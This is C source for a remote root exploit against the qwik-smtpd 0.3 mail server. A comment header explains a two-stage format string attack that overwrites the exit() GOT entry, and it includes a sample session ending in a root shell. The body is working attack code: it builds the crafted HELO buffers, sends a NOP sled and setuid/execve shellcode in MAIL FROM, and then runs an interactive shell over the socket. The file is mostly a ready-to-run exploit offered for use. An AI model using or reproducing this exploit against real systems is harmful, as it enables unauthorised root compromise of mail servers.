/*
** qwik-smtp Remote Root Exploit
** -----------------------------
**
** Bug found by: Dark Eagle <darkeagle [at] list d0t ru>
** Exploit coded by: Carlos Barros <barros [at] barrossecurity d0t com>
** Home Page: http://www.barrossecurity.com
**
** Exploitation techinique:
**
** This bug is a simple format string bug. While coding this exploit, I found just two
** "problems". The first is that our buffer is only 32 bytes long and the second is that
** qwik-smtpd filters spaces chars with the isspace(), this way our 0x0b code used in the
** shellcode is filtered. To circumvent the first problem I divided the exploit in two
** stages. The first one overwrite the LSW of the exit() GOT entry and the second overwrite
** the MSW. Then, we send an EXIT command forcing the qwik-smtpd to jump into our shellcode.
** The second problem was "fixed" using another char (0x10) and then decrementing it before
** calling the int 0x80 syscall.
**
** Notes:
**
** You MUST enter your external IP Address (when attacking remotely) or 127.0.0.1 (when
** attacking locally) cause its IP is printed before our buffer, so its length MUST enter
** in the calculation of the format string attack.
**
**          sprintf(Received,"Received: from %s (HELO %s) (%s) by %s with SMTP; %s\n",
**                  clientHost, clientHelo, clientIP, localHost, timebuf);
**                  ----------
** Destination MUST be one valid email address on the target machine. If not, it will reply
** with one erro code like this:
**
** -> Sending RCPT TO ... ERROR - 550 user not here
**
** Screenshot:
**
** [barros@BarrosSecurity qwik]$ ./a.out -h localhost -u barros@teste.com -t 0 -i 127.0.0.1
**
** ==[ qwik_smtpd Remote Format String Exploit, bY Carlos Barros ]==
**
** *** Target plataform      : qwik_smtpd 0.3 - Fedor Core 2
** *** Target host           : localhost
** *** Target port           : 25
** *** Target GOT            : 0x0804b2e8
**
** *** Target Retaddr        : 0xfeffe6f0
**
** -> Connecting ... OK
** -> Getting the banner ... 220  SMTP service ready
**
** *** STAGE 1 ***
**
** -> Creating EvilBuffer ... OK
** -> Sending HELO with EvilBuffer ... OK
** -> Sending MAIL FROM with Shellcode ... OK
** -> Sending RCPT TO ... OK
** -> Sending DATA ... OK
** -> Sending "." ... OK
**
** *** STAGE 2 ***
**
** -> Creating EvilBuffer ... OK
** -> Sending HELO with EvilBuffer ... OK
** -> Sending MAIL FROM with Shellcode ... OK
** -> Sending RCPT TO ... OK
** -> Sending DATA ... OK
** -> Sending "." ... OK
** -> Attacking ... OK
**
** Try to send some commands. If doesn't work, hit CTRL+C to exit
**
** Linux BarrosSecurity 2.6.8-1.521 #1 Mon Aug 16 09:01:18 EDT 2004 i686 i686 i386                                    GNU/Linux
** uid=0(root) gid=0(root)
** exit
** [barros@BarrosSecurity qwik]$
*/

#include <getopt.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>

/*--< Prototypes >--*/
void Usage(char *);
void fatal(char *);
int  ConectToHost(char *,int);
char *CreateEvilBuffer(int,int);
void doHack(int);
void VerifyLastCommand(int, char *, char *);
void SendBufferAndVerify(int , char *, char *, char *);

/*--< Defines >--*/
#define DEFAULT_PORT            25
#define STDIN                   0
#define STDOUT                  1
#define MAX_BUFFER              1024
#define NOPSIZE                 200
#define NOP                     0x90
#define BUFFER_OFFSET           "567"           // Keep these \"
#define PADDING                 "."             //

struct
{
        char    *Name;
        int     Gotaddr;
        int     Retaddr;
}Targets[] =
        {
                "qwik_smtpd 0.3 - Fedor Core 2",
                0x0804b2e8,
                0xfeffe6f0,

                // Finish
                0,
                0,
                0
        };

// Shellcode by The Itch of Netric (www.netric.org)
char Shellcode[] =
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* setuid(0); */
        "\x31\xc0\x50\x68\x6e\x2f\x73\x68" /* execve() of /bins/h */
        "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
        "\x53\x89\xe1\xb0"

        "\x10\x48\x48\x48\x48\x48"              // Modified by Carlos Barros to skip isspace()

        "\xcd\x80";

unsigned char           STAGE=1;
int                     IP_Len = 0;

int main(int argc, char **argv)
{
        extern  char            *optarg;
        extern  int             optind;
                char            opt;
                char            *Host = NULL;
                int             Port = DEFAULT_PORT;
                int             TargetNumber = 0;
                int             Sock,i;
                char            *EvilBuffer;
                char            Buffer[MAX_BUFFER];
                char            *Rcpt_TO;
                char            Mail_From[NOPSIZE+strlen(Shellcode)+20];

                int ttt;

        fprintf(stdout,"\n==[ qwik_smtpd Remote Format String Exploit, bY Carlos Barros ]==\n\n");

        // Process arguments
        while ( (opt = getopt(argc,argv,"i:h:t:p:u:")) != EOF)
        {
                switch(opt)
                {
                        case 'i':
                                IP_Len = strlen(optarg);
                        break;
                        case 'u':
                                Rcpt_TO = optarg;
                        break;
                        case 'p':
                                Port = atoi(optarg);
                                if(!Port) Usage(argv[0]);
                        break;
                        case 't':
                                TargetNumber = atoi(optarg);
                        break;
                        case 'h':
                                Host = optarg;
                        break;
                        default: Usage(argv[0]);
                        break;
                }
        }
        if(Host == NULL || Rcpt_TO == NULL || !IP_Len) Usage(argv[0]);

        // Verify target
        for(i=0;;i++)
                if(Targets[i].Name == 0) break;
        if(--i<TargetNumber) Usage(argv[0]);

        fprintf(stdout,"*** Target plataform      : %s\n",Targets[TargetNumber].Name);
        fprintf(stdout,"*** Target host           : %s\n",Host);
        fprintf(stdout,"*** Target port           : %u\n",Port);
        fprintf(stdout,"*** Target GOT            : %#010x\n\n",Targets[TargetNumber].Gotaddr);
        fprintf(stdout,"*** Target Retaddr        : %#010x\n\n",Targets[TargetNumber].Retaddr);

        fprintf(stdout,"-> Connecting ... ");
        fflush(stdout);
        Sock = ConectToHost(Host,Port);
        if(Sock == -1) fatal("Could not connect");
        else fprintf(stdout,"OK\n");

        fprintf(stdout,"-> Getting the banner ... ");
        fflush(stdout);
        if(recv(Sock,Buffer,MAX_BUFFER-1,0) != -1)
                fprintf(stdout,"%s",Buffer);
        else
                fatal("RECV");

        for(;STAGE<3;STAGE++)
        {
                fprintf(stdout,"\n*** STAGE %d ***\n\n",STAGE);
                fprintf(stdout,"-> Creating EvilBuffer ... ");
                fflush(stdout);
                EvilBuffer = CreateEvilBuffer(Targets[TargetNumber].Gotaddr,Targets[TargetNumber].Retaddr);
                fprintf(stdout,"OK\n");

                fprintf(stdout,"-> Sending HELO with EvilBuffer ... ");
                fflush(stdout);
                SendBufferAndVerify(Sock,EvilBuffer,"250",0);
                free(EvilBuffer);

                fprintf(stdout,"-> Sending MAIL FROM with Shellcode ... ");
                fflush(stdout);

                // Create the string MAIL FROM NOP+SHELLCODE
                strcpy(Mail_From,"mail from ");
                memset(Mail_From+10,NOP,NOPSIZE);
                Mail_From[10+NOPSIZE-1] = 0;
                strcat(Mail_From,Shellcode);
                strcat(Mail_From,"\n");

                SendBufferAndVerify(Sock,Mail_From,"250",0);

                fprintf(stdout,"-> Sending RCPT TO ... ");
                fflush(stdout);
                snprintf(Buffer,MAX_BUFFER,"rcpt to %s\n",Rcpt_TO);

                SendBufferAndVerify(Sock,Buffer,"250","251");

                fprintf(stdout,"-> Sending DATA ... ");
                fflush(stdout);

                sprintf(Buffer,"data\n");
                SendBufferAndVerify(Sock,Buffer,"354",0);

                fprintf(stdout,"-> Sending \".\" ... ");
                fflush(stdout);
                snprintf(Buffer,MAX_BUFFER,".\n");
                SendBufferAndVerify(Sock,Buffer,"250",0);
        }

        fprintf(stdout,"-> Attacking ... ");
        sprintf(Buffer,"quit\n");
        SendBufferAndVerify(Sock,Buffer,"221",0);

        fprintf(stdout,"\nTry to send some commands. If doesn't work, hit CTRL+C to exit\n\n");
        doHack(Sock);

        close(Sock);
}

void SendBufferAndVerify(int Sock, char *Buffer, char *Code1, char *Code2)
{
        if(send(Sock,Buffer,strlen(Buffer),0) == -1)
                fatal("SEND");
        VerifyLastCommand(Sock,Code1,Code2);
}

void VerifyLastCommand(int Sock, char *Code1, char *Code2)
{
        char Buffer[MAX_BUFFER];

        if(recv(Sock,Buffer,MAX_BUFFER-1,0) != -1)
        {
                if(strstr(Buffer,Code1) || (Code2 && strstr(Buffer,Code2) )) fprintf(stdout,"OK\n",Buffer);
                else
                {
                        *strstr(Buffer,"\n") = 0;
                        fatal(Buffer);
                }
        }
        else
                fatal("RECV");
}

void Usage(char *Prog)
{
        int i;
        fprintf(stderr, "Usage: %s -h hostname <options>\n\n"
                        "Options:\n\n"
                        " -i ipaddress  : Your IP address\n"
                        " -u rcpt_to    : Select one valid destination\n"
                        " -t target     : Select the target\n"
                        " -p portnumber : Sets a new port number <default: 25>\n\n"
                        "Targets:\n\n",Prog);

        for(i=0;;i++)
        {
                if(Targets[i].Name != 0)
                        fprintf(stderr," [%u] %s\n",i,Targets[i].Name);
                else
                        break;
        }
        fprintf(stderr,"\n");
        exit(1);
}

void fatal(char *ErrorMsg)
{
        fprintf(stderr,"ERROR - %s\n\n",ErrorMsg);
        exit(1);
}

int ConectToHost(char *Host,int Port)
{
        struct          sockaddr_in server;
        struct          hostent *hp;
        int             s;

        server.sin_family = AF_INET;
        hp = gethostbyname(Host);
        if(!hp) return(-1);

        memcpy(&server.sin_addr,hp->h_addr,hp->h_length);
        server.sin_port = htons(Port);

        s = socket(PF_INET,SOCK_STREAM,0);
        if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)
                return(-1);

        return(s);
}

char *CreateEvilBuffer(int GOT, int Retaddr)
{
        char    *Buffer = malloc(500);

        if(STAGE==1)
        sprintf(Buffer,
                "helo "PADDING
                "%c%c%c%c"              // GOT ADDR
                "%%%ud"                 // LSW(EGGAddr)
                "%%"BUFFER_OFFSET"$hn"  // Write
                "\n",
                ((u_long)GOT),
                ((u_long)GOT >> 8),
                ((u_long)GOT >> 16),
                ((u_long)GOT >> 24),

                ((Retaddr & 0x0000FFFF) - (27+IP_Len))
                );
        else
        sprintf(Buffer,
                "helo "PADDING
                "%c%c%c%c"              // GOT ADDR
                "%%%ud"                 // LSW(EGGAddr)
                "%%"BUFFER_OFFSET"$hn"  // Write
                "\n",
                ((u_long)GOT+2),
                (((u_long)GOT+2) >> 8),
                (((u_long)GOT+2) >> 16),
                (((u_long)GOT+2) >> 24),

                (((Retaddr & 0xFFFF0000)>>16) - (27+IP_Len))
                );

        return Buffer;
}

void doHack(int Sock)
{
        char            buffer[1024 * 10];
        int             count;
        fd_set          readfs;

        write(Sock,"uname -a;id\n",12);
        while(1)
        {
                FD_ZERO(&readfs);
                FD_SET(STDIN, &readfs);
                FD_SET(Sock, &readfs);
                if(select(Sock + 1, &readfs, NULL, NULL, NULL) > 0)
                {
                        if(FD_ISSET(STDIN, &readfs))
                        {
                                if((count = read(STDIN, buffer, 1024)) <= 0)
                                {
                                        if(errno == EWOULDBLOCK || errno == EAGAIN)
                                                continue;
                                        else
                                        {
                                                close(Sock);
                                                exit(-1);
                                        }
                                }
                                write(Sock, buffer, count);
                        }
                        if(FD_ISSET(Sock, &readfs))
                        {
                                if((count = read(Sock, buffer, 1024)) <= 0)
                                {
                                        if(errno == EWOULDBLOCK || errno == EAGAIN)
                                                continue;
                                        else
                                        {
                                                close(Sock);
                                                exit(-1);
                                        }
                                }
                                write(STDOUT, buffer, count);
                        }
                }
        }
}
